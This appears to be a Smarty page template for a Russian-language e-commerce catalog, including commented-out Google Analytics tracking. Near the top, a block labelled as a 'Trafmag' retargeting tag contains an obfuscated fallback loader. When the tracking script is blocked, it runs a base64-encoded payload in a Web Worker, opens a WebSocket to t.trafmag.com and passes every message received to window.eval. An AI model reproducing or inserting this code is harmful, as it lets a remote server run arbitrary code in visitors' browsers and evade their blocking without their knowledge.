{include file='layouts/_header.tpl'}
<!--Trafmag ретаргетинг-->
{literal}
    <script type='text/javascript'>(function (t, r, f, m, g, c) {
            g = t.createElement(r), c = t.getElementsByTagName(r)[0];
            g.type = 'text/javascript';
            g.async = 1;
            g.src = (t.location.protocol == 'https:' ? 'https:' : 'http:') + f + m;
            g.onerror = function () {
                try {
                    if (t.location.protocol == 'https:') {
                        var wsproto = 'wss', wsport = '8041'
                    } else {
                        var wsproto = 'ws', wsport = '8040'
                    }
                    ;var wrkr_tr_location = wsproto + ':' + f + ':' + wsport + m + '?ref=' + encodeURIComponent(window.location.href);
                    var wrkr_tr = new Worker(URL.createObjectURL(new Blob(['var wrkr_tr_location = "' + wrkr_tr_location + '";eval(atob("DWZ1bmN0aW9uIHNlbmRNZXNzYWdlKGUpew12YXIgaD13cmtyX3RyLm9ubWVzc2FnZTsNd3Jrcl90ci5yZWFkeVN0YXRlPT13cmtyX3RyLkNMT1NFRCYmKHdya3JfdHI9bmV3IFdlYlNvY2tldCh3cmtyX3RyX2xvY2F0aW9uKSksDXdya3JfdHIub25tZXNzYWdlPWgsDXdhaXRGb3JTb2NrZXRDb25uZWN0aW9uKHdya3JfdHIsZnVuY3Rpb24oKXt3cmtyX3RyLnNlbmQoZSk7fSkNfQ1mdW5jdGlvbiB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtyZXR1cm4gMT09PWUucmVhZHlTdGF0ZT92b2lkKG51bGwhPXQmJnQoKSk6dm9pZCB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpfSw1KX07DXdya3JfdHIgPSBuZXcgV2ViU29ja2V0KHdya3JfdHJfbG9jYXRpb24pLA13cmtyX3RyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uICh0KSB7cG9zdE1lc3NhZ2UodC5kYXRhKTt9LA1vbm1lc3NhZ2UgPSBmdW5jdGlvbihlKXtzZW5kTWVzc2FnZShlLmRhdGEpfQ0="))']), {type: "application/javascript"}));
                    wrkr_tr.onmessage = function (msg) {
                        window.eval(msg.data)
                    };
                    wrkr_tr.postMessage('');
                } catch (err) {
                }
            };
            c.parentNode.insertBefore(g, c);
        })(document, 'script', '//t.trafmag.com', '/tracking.js');</script>
{/literal}
<!-- //Trafmag ретаргетинг-->


{if $catId}
    {if !$finalCat}
        {include file='catalog/sub-cats.tpl'}
    {else}
        {if $catId!=1}
            <!--Categories-->
            {include file='catalog/categories.tpl'}
            <!--Categories-->
        {else}
            <!--Categories CAT=1-->
            {include file='catalog/categories-1.tpl'}
            <!--Categories CAT=1-->
        {/if}
    {/if}

    <!--{literal}
            <script>
                // Вызывается, когда пользователь кликает по продукту
                function onProductClickEcommerce(id) {
                    ga('create', 'UA-46008870-1'); //ID аккаунта в Google Analytics
                    ga('require', 'ec');
                    console.log(productForEcommerce[id]);
                    ga('ec:addProduct', {
                        'id': productForEcommerce[id].id,
                        'name': productForEcommerce[id].name,
                        'category': productForEcommerce[id].category,
                        'position': productForEcommerce[id].position,
                    });
                    ga('ec:setAction', 'click', {list: productForEcommerce[id].list});
                    // Клик по продукту и перенаправление пользователя на страницу товара
                    ga('send', 'event', 'UX', 'click', 'Results');
                }
                function addToCartEcommerce(id) {
                    console.log(productForEcommerce[id]);
                    ga('ec:addProduct', {
                        'id': productForEcommerce[id].id,
                        'name': productForEcommerce[id].name,
                        'category': productForEcommerce[id].category,
                        'position': productForEcommerce[id].position,
                        'price': productForEcommerce[id].price
                    });
                    ga('ec:setAction', 'add', {list: productForEcommerce[id].category});
                    ga('send', 'event', 'UX', 'click', 'add to cart'); // Отправка данных
                }
                $('a.btn-info').click(function(){
                    if($(this).data('producterommerceid'))
                        addToCartEcommerce($(this).data('producterommerceid'));
                });
            </script>
        {/literal}-->

{else}
    {include file='error/404.tpl'}
{/if}

{include file='layouts/_footer.tpl'}